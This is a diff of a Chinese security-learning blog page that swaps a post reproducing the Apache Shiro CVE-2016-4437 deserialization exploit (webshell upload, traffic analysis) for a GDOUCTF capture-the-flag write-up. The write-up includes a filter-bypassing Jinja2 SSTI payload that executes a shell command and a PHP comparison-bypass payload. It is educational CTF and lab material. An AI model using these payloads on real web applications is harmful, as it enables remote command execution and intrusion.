@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/20/CVE-2016-4437%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/07/17/GDOUCTF-WP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/06/20/CVE-2016-4437%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">CVE-2016-4437复现</a>
+          <a href="/2023/07/17/GDOUCTF-WP/" class="post-title-link" itemprop="url">GDOUCTF WP</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-06-20 20:19:04" itemprop="dateCreated datePublished" datetime="2023-06-20T20:19:04+08:00">2023-06-20</time>
+      <time title="创建时间：2023-07-17 20:11:40" itemprop="dateCreated datePublished" datetime="2023-07-17T20:11:40+08:00">2023-07-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -247,12 +247,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/vulhub/" itemprop="url" rel="index"><span itemprop="name">vulhub</span></a>
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
         </span>
     </span>
 
   
-    <span id="/2023/06/20/CVE-2016-4437%E5%A4%8D%E7%8E%B0/" class="post-meta-item leancloud_visitors" data-flag-title="CVE-2016-4437复现" title="阅读次数">
+    <span id="/2023/07/17/GDOUCTF-WP/" class="post-meta-item leancloud_visitors" data-flag-title="GDOUCTF WP" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>733</span>
+      <span>2.1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -283,45 +283,72 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
-<p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为<code>rememberMe</code>的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
-<p>所以被称为<code>Apache Shiro 1.2.4反序列化漏洞</code>。</p>
-<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用vulhub搭建环境。</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202534202.png" alt="image-20230620202534202"></p>
-<p>访问<code>you-ip:8080</code></p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202604159.png" alt="image-20230620202604159"></p>
-<p>然后进行登录（随意账号密码），然后抓包</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202653697.png" alt="image-20230620202653697"></p>
-<p>会发现存在<code>rememberMe</code>这个cookie，所以这里大概率是使用shiro框架。</p>
-<p>下面使用工具进行利用：<a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack/releases/tag/2.2">https://github.com/j1anFen/shiro_attack/releases/tag/2.2</a></p>
-<p>这里为了查看流量，使用wireshark进行抓包，可以直接在宿主机进行抓包（搭建docker的宿主机）</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202850422.png" alt="image-20230620202850422"></p>
-<p>然后进行利用，先点击爆破密钥-&gt;爆破利用链-&gt;存在利用链再执行命令-&gt;上传内存马</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620202903118.png" alt="image-20230620202903118"></p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203013360.png" alt="image-20230620203013360"></p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203023292.png" alt="image-20230620203023292"></p>
-<p>上传内存马</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203031325.png" alt="image-20230620203031325"></p>
-<p>使用蚁剑连接内存马</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203056358.png" alt="image-20230620203056358"></p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203101914.png" alt="image-20230620203101914"></p>
-<p>成功得到shell</p>
-<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>过滤http请求，然后一个个流进行查看</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203224831.png" alt="image-20230620203224831"></p>
-<p>前面的几个都跟这个相似，大概是为了验证是否存在漏洞、爆破密钥以及爆破利用链的流量</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203411322.png" alt="image-20230620203411322"></p>
-<p>然后得到下面这一段流量</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620203717913.png" alt="image-20230620203717913"></p>
-<p>techo是什么？查看该工具的的源码</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204040564.png" alt="image-20230620204040564"></p>
-<p>发现是其头信息，这也是该工具的一个特征</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204208987.png" alt="image-20230620204208987"></p>
-<p>c这里是base64编码的命令<code>ls</code>，所以命令是以base64编码的信息，c的值是执行的命令</p>
-<p>下面使用<code>$$$</code>包裹的通过base64解码之后就是命令执行的结果</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204640640.png" alt="image-20230620204640640"></p>
-<p>p代表内存马的密码，path表示内存马名，下面的表示内存马的内容</p>
-<p>后面的流量都是蚁剑的流量，在此就不在分析了</p>
-<p><img src="/images/CVE-2016-4437%E5%A4%8D%E7%8E%B0/image-20230620204825376.png" alt="image-20230620204825376"></p>
+          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-ze"><a href="#ez-ze" class="headerlink" title="ez_ze"></a>ez_ze</h2><p>这题考察的是SSTI注入的绕过手法，也是学习到了一些新的SSTI绕过手法</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/129856818">SSTI模板注入-<br>中括号、args、下划线、单双引号、os、request、花括号、数字被过滤绕过</a></p>
+<p>最后得到的payload如下：</p>
+<pre><code>&#123;% set three=dict(ccc=a)|join|count %&#125;&#123;% set eight=dict(cccccccc=a)|join|count %&#125;&#123;% set pop=dict(pop=a)|join %&#125;&#123;% set xhx=(lipsum|string|list)|attr(pop)(three*eight) %&#125;&#123;% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %&#125;&#123;% set get=dict(get=a)|join %&#125;&#123;% set shell=dict(o=a,s=b)|join %&#125;&#123;% set aaa=dict(po=a,pen=b)|join %&#125;&#123;% set builtins=(xhx,xhx,dict(builtins=a)|join,xhx,xhx)|join %&#125;&#123;% set read=dict(read=a)|join %&#125;&#123;% print ((lipsum|attr(globals))|attr(get)(shell)|attr(aaa)('cat /flag')|attr(read)()) %&#125;
+</code></pre>
+<p><img src="/images/GDOUCTF-WP/image-20240717201415816.png" alt="image-20240717201415816"></p>
+<h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>这题在snack.js中把除以一千直接去掉</p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201426992.png" alt="image-20240717201426992"></p>
+<p>可以成功得到flag</p>
+<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>给出了源码，绕过即可得到flag</p>
+<pre><code>&lt;?php
+error_reporting(0);
+header(&quot;Content-type:text/html;charset=utf-8&quot;);
+if (isset($_POST[&#39;gdou&#39;]) &amp;&amp; isset($_POST[&#39;ctf&#39;])) &#123;
+    $b = $_POST[&#39;ctf&#39;];
+    $a = $_POST[&#39;gdou&#39;];
+    if ($_POST[&#39;gdou&#39;] != $_POST[&#39;ctf&#39;] &amp;&amp; md5($a) === md5($b)) &#123;
+        if (isset($_COOKIE[&#39;cookie&#39;])) &#123;
+            if ($_COOKIE[&#39;cookie&#39;] == &#39;j0k3r&#39;) &#123;
+                if (isset($_GET[&#39;aaa&#39;]) &amp;&amp; isset($_GET[&#39;bbb&#39;])) &#123;
+                    $aaa = $_GET[&#39;aaa&#39;];
+                    $bbb = $_GET[&#39;bbb&#39;];
+                    if ($aaa == 114514 &amp;&amp; $bbb == 114514 &amp;&amp; $aaa != $bbb) &#123;
+                        $give = &#39;cancanwordflag&#39;;
+                        $get = &#39;hacker!&#39;;
+                        if (!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])) &#123;
+                            die($give);
+                        &#125;
+                        if ($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;) &#123;
+                            die($get);
+                        &#125;
+                        foreach ($_POST as $key =&gt; $value) &#123;
+                            $$key = $value;
+                        &#125;
+                        foreach ($_GET as $key =&gt; $value) &#123;
+                            $$key = $$value;
+                        &#125;
+                        echo $f1ag;
+                    &#125; else &#123;
+                        echo &quot;洗洗睡吧&quot;;
+                    &#125;
+                &#125; else &#123;
+                    echo &quot;行不行啊细狗&quot;;
+                &#125;
+            &#125;
+        &#125; else &#123;
+            echo &#39;菜菜&#39;;
+        &#125;
+    &#125; else &#123;
+        echo &quot;就这?&quot;;
+    &#125;
+&#125; else &#123;
+    echo &quot;别来沾边&quot;;
+&#125; ?&gt; 
+</code></pre>
+<p>payload如下：</p>
+<pre><code>GET:?aaa=114514a&amp;bbb=114514bPOST:gdou[]=1&amp;ctf[]=2&amp;flag[]=flagCookie:cookie=j0k3r
+</code></pre>
+<p><img src="/images/GDOUCTF-WP/image-20240717201445856.png" alt="image-20240717201445856"></p>
+<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p><img src="/images/GDOUCTF-WP/image-20240717201455545.png" alt="image-20240717201455545"></p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201506193.png" alt="image-20240717201506193"></p>
+<p>然后使用PUT方式访问，得到flag</p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201511106.png" alt="image-20240717201511106"></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><p><img src="/images/GDOUCTF-WP/image-20240717201516723.png" alt="image-20240717201516723"></p>
+<p>js简单的替换加密，替换回来就可以了</p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201523947.png" alt="image-20240717201523947"></p>
 
       
     </div>
@@ -341,7 +368,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/8/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/8/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -365,7 +392,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
